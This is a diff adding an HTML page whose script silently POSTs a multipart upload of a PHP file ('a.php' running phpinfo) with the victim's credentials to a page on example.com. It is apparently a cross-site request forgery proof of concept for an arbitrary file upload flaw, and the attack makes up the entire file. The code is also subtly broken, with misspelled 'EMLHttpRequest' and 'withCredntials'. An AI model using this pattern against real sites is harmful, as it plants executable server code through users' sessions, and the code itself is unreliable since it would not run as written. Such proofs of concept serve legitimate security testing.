@@ -1,0 +1,21 @@
+<body>
+
+<script>
+  data = '\
+----BNDRY\n\
+Content-Disposition: form-data; name="imgfile"; filename="a.php"\n\
+Content-Type: text/plain\n\
+\n\
+<?php phpinfo();\n\
+\n\
+----BNDRY----\n\
+';
+
+  var req = new EMLHttpRequest();
+  req.open('POST', 'http://example.com/45/45-005.php');
+  req.setRequestHeader('Content-Type', 'multipart/form-data; boundary=--BNDRY');
+  req.withCredntials = true;
+  req.send(data);
+</script>
+</body>
+
